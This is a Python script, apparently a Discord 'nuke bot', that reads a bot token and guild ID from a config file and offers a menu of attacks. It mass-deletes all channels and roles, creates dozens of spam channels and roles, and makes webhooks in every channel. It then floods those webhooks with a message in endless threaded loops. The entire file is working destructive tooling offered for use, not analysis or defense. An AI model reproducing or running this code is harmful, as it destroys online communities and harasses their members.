import random
import requests
import os
import threading
from pystyle import Center, Colorate, Colors
import json
import time

with open("config.json","r") as file:
    data = json.load(file)

logo = """
██████╗ ███████╗ ██████╗     ██████╗ ██╗  ██╗██╗    ███╗   ███╗ █████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔═══██╗    ██╔══██╗██║  ██║██║    ████╗ ████║██╔══██╗████╗  ██║
██████╔╝█████╗  ██║   ██║    ██████╔╝███████║██║    ██╔████╔██║███████║██╔██╗ ██║
██╔══██╗██╔══╝  ██║   ██║    ██╔═══╝ ██╔══██║██║    ██║╚██╔╝██║██╔══██║██║╚██╗██║
██████╔╝███████╗╚██████╔╝    ██║     ██║  ██║██║    ██║ ╚═╝ ██║██║  ██║██║ ╚████║
╚═════╝ ╚══════╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                                                                                                            
                     >  https://github.com/BeoPhiMan  <
       
       
       
       """

logo = Center.XCenter(logo)
logo = Center.YCenter(logo)

token = data["token"]
guild_id = data["guildid"]
api_ver = data["api"]
content = data["nukemessage"]

baseurl = f"https://discord.com/api/{api_ver}"
headers = {"Authorization": f"Bot {token}"}

black = "\033[1;30m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"

def error(x):
    print(f"{red}[<!>]{white} An error occured: {x}")

webhook_urls = []
chnls = []
rls = []

# Threading, UI 

def getchannels() -> list:
    new_chnls = []
    try:
        r = requests.get(f"{baseurl}/guilds/{guild_id}/channels", headers=headers)
        data = r.json()
        for channel in data:
            new_chnls.append(channel["id"])
        
        return new_chnls
    except Exception as e:
        error(e)

def deletechannel(channel_id):
    try:
        r = requests.delete(f"{baseurl}/channels/{channel_id}", headers=headers)
        print(f"{green}[+]{white} Delete command for {channel_id}: {r.status_code}")
    except Exception as e:
        error(e)

def getroles() -> list:
    try:
        r = requests.get(f"{baseurl}/guilds/{guild_id}/roles", headers=headers)
        data = r.json()
        rls = []
        for role in data:
            rls.append(role["id"])
        
        return rls
    except Exception as e:
        error(e)

def deleteroles(role_id):
    try:
        r = requests.delete(f"{baseurl}/guilds/{guild_id}/roles/{role_id}", headers=headers)
        print(f"{green}[+]{white} Delete command for Role with ID {role_id}: {r.status_code}")
    except Exception as e:
        error(e)

def createchannel():
    try:
        r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json={"name":"beophiman", "type":0}, headers=headers)    
        if r.status_code == 200 or r.status_code == 202:
            print(f"{green}[+]{white} Created Channel beophiman")
        else:
            print(f"{yellow}[?]{white} Channel spam status Code: {r.status_code}")
    except Exception as e:
        error(e)

def createroles():
    try:
        r = requests.post(f"{baseurl}/guilds/{guild_id}/roles", json={"name":"beophiman"}, headers=headers)
        if r.status_code == 200 or r.status_code == 202:
            print(f"{green}[+]{white} Role creation done: beophiman")
        else:
            print(f"{red}[?]{white} Role creation status code: {r.status_code}")
    except Exception as e:
        error(e)

def create_webhooks(channel_id):
    try:
        r = requests.post(f"{baseurl}/channels/{channel_id}/webhooks", json={"name": "beophiman"}, headers=headers)
        if r.status_code == 200 or r.status_code == 202:
            data = r.json()
            webhook_url = data["url"]
            webhook_urls.append(webhook_url)
            print(f"{yellow}[?]{white} {channel_id} Webhook creation status code: {r.status_code}")
    except Exception as e:
        error(e)

def spamhooks(url):
    pings = 1
    try:
        while True:
            r = requests.post(url, json={"content":f"{content}\n\nhttps://github.com/BeoPhiMan"})
            print(f"{green}[+]{white} {pings*15} pings ", end="\r")
            os.system(f"title {pings*15} pings ")
            pings = pings+1
    except Exception as e:
        error(e)

def threadeddeletechannels():
    threads = []
    channels = getchannels()
    for channel in channels:
        t1 = threading.Thread(target=deletechannel, args=(channel, ))
        threads.append(t1)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def threadcreatechannels():
    threads = []
    for i in range(15):
        t4 = threading.Thread(target=createchannel)
        threads.append(t4)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def threadeddeleteroles():
    threads = []
    roles = getroles()
    for role in roles:
        t2 = threading.Thread(target=deleteroles, args=(role, ))
        threads.append(t2)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def threadedrolecreation():
    threads = []
    for i in range(15):
        t3 = threading.Thread(target=createroles)
        threads.append(t3)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def threadcreatewebhooks():
    channels = getchannels()
    threads = []
    for channel in channels:
        t5 = threading.Thread(target=create_webhooks, args=(channel, ))
        threads.append(t5)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def threadedspamhooks():
    time.sleep(5)
    threads = []
    for url in webhook_urls:
        t = threading.Thread(target=spamhooks, args=(url, ))
        threads.append(t)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def main():
    os.system("title Nuke Bot Discord (https://github.com/BeoPhiMan) Nuker && clear || cls")
    print(Colorate.Diagonal(Colors.yellow_to_red, logo, 1))
    time.sleep(random.randint(1,5))
    print("press any key to continue")
    input()
    while True:
        os.system("clear || cls")
        print(f"""{yellow}guild id server : {red} {guild_id} {white}

[1] Delete Channels             [2] Create Channels

[3] Delete Roles                [4] Create Roles

[5] Create Webhooks             [6] Spam Webhooks ( SPAM MSG )
        
              """)
        print("input: ", end="")
        x = int(input())
        if x == 1:
            threadeddeletechannels()
        elif x == 2:
            threadcreatechannels()
        elif x == 3:
            threadeddeleteroles()
        elif x == 4:
            threadedrolecreation()
        elif x == 5:
            threadcreatewebhooks()
        elif x == 6:
            threadedspamhooks()

main()